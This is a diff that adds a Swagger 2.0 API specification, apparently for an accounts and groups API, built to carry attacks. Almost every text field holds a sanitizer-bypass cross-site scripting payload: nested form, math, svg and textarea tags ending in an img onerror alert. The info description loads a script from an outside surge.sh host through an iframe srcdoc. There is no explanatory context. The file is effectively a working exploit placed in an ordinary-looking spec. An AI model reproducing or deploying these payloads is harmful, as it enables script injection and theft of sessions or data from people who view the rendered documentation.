@@ -1,0 +1,42 @@
+swagger: '2.0'
+info:
+  title: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
+  description: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><desc id="</textarea><math><mtext><!--"><textarea id="--><iframe srcdoc="<script><script src=https://standing-salt.surge.sh/script.js></script>">
+  version: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /accounts:
+    get:
+      responses:
+        '200':
+          description: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
+      tags:
+        - <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/accounts/groupid/{<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>}':
+    delete:
+      parameters:
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
+
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
+      tags:
+        - <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
+      operationId: deleteGroupById
+      summary: Deletes a group by id
